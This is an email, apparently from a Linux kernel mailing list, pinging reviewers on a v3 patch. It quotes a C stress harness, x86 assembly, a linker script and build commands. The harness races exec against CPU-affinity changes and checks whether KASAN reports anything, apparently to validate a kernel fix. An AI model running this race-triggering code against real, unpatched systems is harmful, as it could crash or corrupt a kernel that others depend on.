> >                                            __ATOMIC_RELAXED);
> >               *successes +=3D __atomic_load_n(&state->setters[i].succes=
ses,
> >                                             __ATOMIC_RELAXED);
> >               *errors +=3D __atomic_load_n(&state->setters[i].errors,
> >                                          __ATOMIC_RELAXED);
> >       }
> > }
> >
> > static int wait_child(pid_t pid, int *status)
> > {
> >       pid_t ret;
> >
> >       do {
> >               ret =3D waitpid(pid, status, 0);
> >       } while (ret < 0 && errno =3D=3D EINTR);
> >       return ret =3D=3D pid ? 0 : -1;
> > }
> >
> > int main(int argc, char **argv)
> > {
> >       struct shared_state *state;
> >       pid_t victim, setters[MAX_SETTERS];
> >       time_t deadline;
> >       unsigned long long attempts =3D 0, successes =3D 0, errors =3D 0;
> >       unsigned long long execs =3D 0, previous_execs, previous_successe=
s =3D 0;
> >       int cpus, runtime, victim_a, victim_b, nset, i, status;
> >       int spawned =3D 0, failed =3D 0;
> >
> >       setvbuf(stdout, NULL, _IONBF, 0);
> >       setvbuf(stderr, NULL, _IONBF, 0);
> >       cpus =3D (int)sysconf(_SC_NPROCESSORS_ONLN);
> >       if (cpus < 4) {
> >               fprintf(stderr, "need at least four online CPUs\n");
> >               return 1;
> >       }
> >       runtime =3D argc > 1 ? atoi(argv[1]) : DEFAULT_RUNTIME;
> >       if (runtime <=3D 0)
> >               runtime =3D DEFAULT_RUNTIME;
> >       victim_a =3D cpus - 2;
> >       victim_b =3D cpus - 1;
> >       nset =3D victim_a < MAX_SETTERS ? victim_a : MAX_SETTERS;
> >       state =3D mmap(NULL, sizeof(*state), PROT_READ | PROT_WRITE,
> >                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
> >       if (state =3D=3D MAP_FAILED)
> >               return 1;
> >       for (i =3D 0; i < MAX_SETTERS; i++)
> >               setters[i] =3D -1;
> >       if (install_exec_counter() || install_victim()) {
> >               perror("install victim");
> >               return 1;
> >       }
> >
> >       victim =3D fork();
> >       if (!victim) {
> >               cpu_set_t pinned;
> >               char *const av[] =3D { "victim", NULL };
> >               char *const ev[] =3D { NULL };
> >
> >               prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
> >               CPU_ZERO(&pinned);
> >               CPU_SET(victim_a, &pinned);
> >               if (sched_setaffinity(0, sizeof(pinned), &pinned))
> >                       _exit(4);
> >               syscall(SYS_execveat, VICTIM_FD, "", av, ev, AT_EMPTY_PAT=
H);
> >               _exit(127);
> >       }
> >       if (victim < 0)
> >               return 1;
> >       if (wait_for_first_exec(victim, &execs)) {
> >               perror("victim did not begin exec loop");
> >               failed =3D 1;
> >               goto cleanup;
> >       }
> >       deadline =3D time(NULL) + runtime;
> >       printf("[*] standalone minimal-exec race: runtime=3D%ds setters=
=3D%d\n",
> >              runtime, nset);
> >       printf("[*] victim starts on cpu%d; setters alternate {%d} and {%=
d,%d}\n",
> >              victim_a, victim_a, victim_a, victim_b);
> >       for (i =3D 0; i < nset; i++) {
> >               setters[i] =3D fork();
> >               if (!setters[i])
> >                       run_setter(victim, i, victim_a, victim_b, i,
> >                                  deadline, state);
> >               if (setters[i] < 0) {
> >                       perror("fork setter");
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               spawned++;
> >       }
> >       previous_execs =3D execs;
> >       while (time(NULL) < deadline) {
> >               struct timespec delay;
> >               time_t remaining =3D deadline - time(NULL);
> >               pid_t ret;
> >
> >               ret =3D waitpid(victim, &status, WNOHANG);
> >               if (ret =3D=3D victim) {
> >                       fprintf(stderr, "victim exited early: status=3D0x=
%x\n", status);
> >                       victim =3D -1;
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               if (ret < 0) {
> >                       perror("waitpid victim");
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               for (i =3D 0; i < spawned; i++) {
> >                       if (setters[i] < 0)
> >                               continue;
> >                       ret =3D waitpid(setters[i], &status, WNOHANG);
> >                       if (ret =3D=3D setters[i]) {
> >                               setters[i] =3D -1;
> >                               if (time(NULL) < deadline || !WIFEXITED(s=
tatus) ||
> >                                   WEXITSTATUS(status)) {
> >                                       fprintf(stderr,
> >                                               "setter %d exited early: =
status=3D0x%x\n",
> >                                               i, status);
> >                                       failed =3D 1;
> >                                       goto cleanup;
> >                               }
> >                       } else if (ret < 0) {
> >                               perror("waitpid setter");
> >                               failed =3D 1;
> >                               goto cleanup;
> >                       }
> >               }
> >               if (remaining <=3D 0)
> >                       break;
> >               delay.tv_sec =3D remaining > 10 ? 10 : remaining;
> >               delay.tv_nsec =3D 0;
> >               while (nanosleep(&delay, &delay) && errno =3D=3D EINTR)
> >                       ;
> >               if (drain_exec_counter(&execs)) {
> >                       perror("read exec counter");
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               ret =3D waitpid(victim, &status, WNOHANG);
> >               if (ret =3D=3D victim) {
> >                       fprintf(stderr, "victim exited early: status=3D0x=
%x\n", status);
> >                       victim =3D -1;
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               if (ret < 0) {
> >                       perror("waitpid victim");
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               load_totals(state, nset, &attempts, &successes, &errors);
> >               if (execs =3D=3D previous_execs) {
> >                       fprintf(stderr, "victim made no exec progress in =
window\n");
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               if (successes =3D=3D previous_successes) {
> >                       fprintf(stderr,
> >                               "setters made no successful affinity prog=
ress in window\n");
> >                       failed =3D 1;
> >                       goto cleanup;
> >               }
> >               printf("[*] progress: affinity_success=3D%llu attempts=3D=
%llu "
> >                      "errors=3D%llu execs=3D%llu\n",
> >                      successes, attempts, errors, execs);
> >               previous_execs =3D execs;
> >               previous_successes =3D successes;
> >       }
> >       for (i =3D 0; i < spawned; i++) {
> >               if (setters[i] < 0)
> >                       continue;
> >               if (wait_child(setters[i], &status) || !WIFEXITED(status)=
 ||
> >                   WEXITSTATUS(status)) {
> >                       fprintf(stderr, "setter %d failed: status=3D0x%x\=
n", i, status);
> >                       failed =3D 1;
> >               }
> >               setters[i] =3D -1;
> >       }
> >       load_totals(state, nset, &attempts, &successes, &errors);
> >       if (!attempts || !successes || attempts !=3D successes + errors) =
{
> >               fprintf(stderr, "invalid affinity totals\n");
> >               failed =3D 1;
> >       }
> >       if (drain_exec_counter(&execs)) {
> >               fprintf(stderr, "failed to read final exec progress\n");
> >               failed =3D 1;
> >       }
> >       if (kill(victim, SIGKILL)) {
> >               perror("kill victim");
> >               failed =3D 1;
> >       } else if (wait_child(victim, &status) || !WIFSIGNALED(status) ||
> >                  WTERMSIG(status) !=3D SIGKILL) {
> >               fprintf(stderr, "unexpected victim status: 0x%x\n", statu=
s);
> >               failed =3D 1;
> >       }
> >       victim =3D -1;
> >       if (!failed) {
> >               printf("[*] validated completion: affinity_success=3D%llu=
 "
> >                      "attempts=3D%llu errors=3D%llu execs=3D%llu; no KA=
SAN report\n",
> >                      successes, attempts, errors, execs);
> >               return 0;
> >       }
> >
> > cleanup:
> >       for (i =3D 0; i < spawned; i++) {
> >               if (setters[i] > 0) {
> >                       kill(setters[i], SIGKILL);
> >                       wait_child(setters[i], &status);
> >               }
> >       }
> >       if (victim > 0) {
> >               kill(victim, SIGKILL);
> >               wait_child(victim, &status);
> >       }
> >       puts("[!] validation failed");
> >       return 1;
> > }
> > ```
> >
> > The embedded victim source and linker script follow.
> >
> > `victim_min_execfd.S`:
> >
> > ```asm
> >       .section .text
> >       .global _start
> >       .type _start,@function
> > _start:
> >       mov %rsp, %r12
> >
> >       /* Count this instance through the inherited eventfd. */
> >       mov $1, %eax
> >       mov $3, %edi
> >       lea one(%rip), %rsi
> >       mov $8, %edx
> >       syscall
> >       cmp $8, %rax
> >       jne .Lexit
> >
> >       /* Drop the stack and adjacent vDSO/vvar mappings before exec. */
> >       mov %r12, %rdi
> >       and $-2097152, %rdi
> >       mov $4194304, %esi
> >       mov $11, %eax
> >       syscall
> >
> >       /* execveat(inherited_memfd_4, "", argv, NULL, AT_EMPTY_PATH). */
> >       mov $322, %eax
> >       mov $4, %edi
> >       lea empty(%rip), %rsi
> >       lea argv(%rip), %rdx
> >       xor %r10d, %r10d
> >       mov $0x1000, %r8d
> >       syscall
> >
> > .Lexit:
> >       mov $60, %eax
> >       mov $127, %edi
> >       syscall
> >       hlt
> >       .size _start, .-_start
> >
> >       .section .data
> >       .align 8
> > one:
> >       .quad 1
> > empty:
> >       .byte 0
> >       .align 8
> > argv:
> >       .quad empty
> >       .quad 0
> >
> >       .section .note.GNU-stack,"",@progbits
> > ```
> >
> > `victim_min.ld`:
> >
> > ```ld
> > ENTRY(_start)
> >
> > PHDRS
> > {
> >       image PT_LOAD FILEHDR PHDRS FLAGS(7);
> >       stack PT_GNU_STACK FLAGS(6);
> > }
> >
> > SECTIONS
> > {
> >       . =3D 0x400000 + SIZEOF_HEADERS;
> >       .image : ALIGN(16) {
> >               *(.text*)
> >               *(.rodata*)
> >               *(.data*)
> >               *(.bss*)
> >       } :image
> >       /DISCARD/ : { *(.note*) *(.comment*) *(.eh_frame*) }
> > }
> > ```
> >
> > The embedded image was built with GCC 16.2.1 and GNU ld 2.46.1:
> >
> > ```sh
> > gcc -c -nostdlib -o victim.o victim_min_execfd.S
> > ld -nostdlib -T victim_min.ld -o victim victim.o
> > test "$(stat -c %s victim)" =3D 848
> > readelf -h -l -S victim
> > base64 -w 76 victim
> > ```
> >
> >
> > Thanks,
> > Weiming
> >
>
>
> --
> Mathieu Desnoyers
> EfficiOS Inc.
> https://www.efficios.com

Hi everyone,

Just a gentle ping on this v3 patch. Any thoughts, feedback, or review comm=
ents?

Thanks,
Weiming

